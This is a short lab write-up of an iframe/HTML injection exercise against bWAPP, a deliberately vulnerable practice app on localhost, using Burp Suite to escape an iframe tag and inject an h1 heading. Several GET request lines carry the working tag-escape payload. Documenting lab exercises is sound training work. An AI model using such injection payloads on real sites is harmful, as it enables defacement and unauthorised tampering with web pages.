---
custom_edit_url: null
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Knign/Write-ups/assets/110326359/2c6cebae-2df1-40d6-b57b-6f04d890c8d8)
</figure>

Let's intercept the request in Burpsuite.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Knign/Write-ups/assets/110326359/2105e054-77f8-4d7d-944b-baf9743c029f)
</figure>

We can now forward this request to the `Repeater` in order to make modifications to it.

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Knign/Write-ups/assets/110326359/cf370f62-63e4-47b5-9d53-a8b5b191a0fb)
</figure>

As we can see the URL is being used to complete the `<iframe>` tag.

Let's try to escape the tag by using the following request URL:

```
GET /bWAPP/iframei.php?ParamUrl=robots.txt&ParamHeight=250&ParamWidth=250"></iframe> HTTP/1.1
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Knign/Write-ups/assets/110326359/920657f0-9e30-4d22-aa21-0b9e924b67b2)
</figure>

We can see that the `</iframe>` tag set by the application now is a lone closing tag. This proves that we have successfully escaped the tag.

We can now perform a regular HTML URL injection.

```
GET /bWAPP/iframei.php?ParamUrl=robots.txt&ParamHeight=250&ParamWidth=250"></iframe><h1>GetHacked</h1> HTTP/1.1
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Knign/Write-ups/assets/110326359/06bbc5ef-0288-49fa-b37e-2a996a195a3a)
</figure>

We can even do the same exploit directly in the browser using the following URL:

```
http://localhost/bWAPP/iframei.php?ParamUrl=robots.txt&ParamHeight=250&ParamWidth=250"></iframe><h1>GetHacked</h1>
```

<figure style={{ textAlign: 'center' }}>
![6](https://github.com/Knign/Write-ups/assets/110326359/7b3b8f4c-c065-45ef-92b4-a13becc853b3)
</figure>

We can see our message `<h1>` tags.
